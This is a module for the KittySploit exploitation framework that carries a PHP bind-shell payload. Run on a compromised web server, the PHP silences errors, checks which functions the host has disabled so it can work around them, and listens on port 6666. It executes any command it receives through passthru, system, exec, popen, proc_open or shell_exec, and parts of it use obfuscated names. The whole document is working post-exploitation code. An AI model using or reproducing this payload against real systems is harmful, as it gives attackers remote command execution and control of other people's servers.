from kittysploit import *

class Module(Post, Bind):

	__info__ = {
		"name": "Bind TCP shell",
		"description": "Bind TCP shell in PHP using a bind handler",
		"arch": Arch.PHP,
	}	
		
	def run(self):
		self.start_handler()
		self.php_eval(f"""
		  @error_reporting(0);
		  @set_time_limit(0); @ignore_user_abort(1); @ini_set('max_execution_time',0);
		  $TSChg=@ini_get('disable_functions');
		  if(!empty($TSChg)){{
			$TSChg=preg_replace('/[, ]+/', ',', $TSChg);
			$TSChg=explode(',', $TSChg);
			$TSChg=array_map('trim', $TSChg);
		  }}else{{
			$TSChg=array();
		  }}
		  
		$port=6666;

		$scl='socket_create_listen';
		if(is_callable($scl)&&!in_array($scl,$TSChg)){{
		  $sock=@$scl($port);
		}}else{{
		  $sock=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
		  $ret=@socket_bind($sock,0,$port);
		  $ret=@socket_listen($sock,5);
		}}
		$msgsock=@socket_accept($sock);
		@socket_close($sock);

		while(FALSE!==@socket_select($r=array($msgsock), $w=NULL, $e=NULL, NULL))
		{{
		  $o = '';
		  $c=@socket_read($msgsock,2048,PHP_NORMAL_READ);
		  if(FALSE===$c){{break;}}
		  if(substr($c,0,3) == 'cd '){{
			chdir(substr($c,3,-1));
		  }} else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {{
			break;
		  }}else{{
			
		  if (FALSE !== strpos(strtolower(PHP_OS), 'win' )) {{
			$c=$c." 2>&1\n";
		  }}
		  $OzwMIca='is_callable';
		  $ozGkJ='in_array';
		  
		  if($OzwMIca('passthru')and!$ozGkJ('passthru',$TSChg)){{
			ob_start();
			passthru($c);
			$o=ob_get_contents();
			ob_end_clean();
		  }}else
		  if($OzwMIca('system')and!$ozGkJ('system',$TSChg)){{
			ob_start();
			system($c);
			$o=ob_get_contents();
			ob_end_clean();
		  }}else
		  if($OzwMIca('exec')and!$ozGkJ('exec',$TSChg)){{
			$o=array();
			exec($c,$o);
			$o=join(chr(10),$o).chr(10);
		  }}else
		  if($OzwMIca('popen')and!$ozGkJ('popen',$TSChg)){{
			$fp=popen($c,'r');
			$o=NULL;
			if(is_resource($fp)){{
			  while(!feof($fp)){{
				$o.=fread($fp,1024);
			  }}
			}}
			@pclose($fp);
		  }}else
		  if($OzwMIca('proc_open')and!$ozGkJ('proc_open',$TSChg)){{
			$handle=proc_open($c,array(array('pipe','r'),array('pipe','w'),array('pipe','w')),$pipes);
			$o=NULL;
			while(!feof($pipes[1])){{
			  $o.=fread($pipes[1],1024);
			}}
			@proc_close($handle);
		  }}else
		  if($OzwMIca('shell_exec')and!$ozGkJ('shell_exec',$TSChg)){{
			$o=shell_exec($c);
		  }}else
		  {{
			$o=0;
		  }}
		
		  }}
		  @socket_write($msgsock,$o,strlen($o));
		}}
		@socket_close($msgsock);
""")